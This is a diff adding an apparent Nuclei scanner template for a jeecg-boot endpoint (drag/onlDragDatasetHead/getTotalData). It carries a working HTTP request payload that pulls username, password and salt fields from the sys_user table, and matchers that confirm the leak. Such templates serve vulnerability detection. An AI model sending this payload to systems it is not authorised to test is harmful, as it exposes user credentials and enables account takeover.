@@ -1,0 +1,68 @@
+id: jeecg-boot-drag-getTotalData-sqli-bypass
+
+info:
+  name: jeecg-boot-drag-getTotalData-sqli-bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: jeecgboot, password-reset, vulnerability
+
+http:
+  - raw:
+      # - |-
+      #   POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1
+      #   Host: {{Hostname}}
+      #   Content-Type: application/json
+      #   Content-Length: {{len(body)}}
+
+      #   {
+      #     "tableName": "sys_user",
+      #     "compName": "test",
+      #     "condition": {
+      #       "filter": {}
+      #     },
+      #     "config": {
+      #       "assistValue": [],
+      #       "assistType": [],
+      #       "name": [
+      #         {"fieldName": "username,password,salt", "fieldType": "string"},
+      #         {"fieldName": "id", "fieldType": "string"}
+      #       ],
+      #       "value": [
+      #         {"fieldName": "id", "fieldType": "string"}
+      #       ],
+      #       "type": []
+      #     }
+      #   }
+      - |-
+        POST /drag/onlDragDatasetHead/getTotalData HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: {{len(body)}}
+
+        {
+          "tableName": "sys_user",
+          "compName": "test",
+          "condition": {
+            "filter": {}
+          },
+          "config": {
+            "assistValue": [],
+            "assistType": [],
+            "name": [
+              {"fieldName": "username,password,salt", "fieldType": "string"},
+              {"fieldName": "id", "fieldType": "string"}
+            ],
+            "value": [
+              {"fieldName": "id", "fieldType": "string"}
+            ],
+            "type": []
+          }
+        }
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - 'contains(body, "username")'
+          - 'contains(body, "password")'
+        condition: and
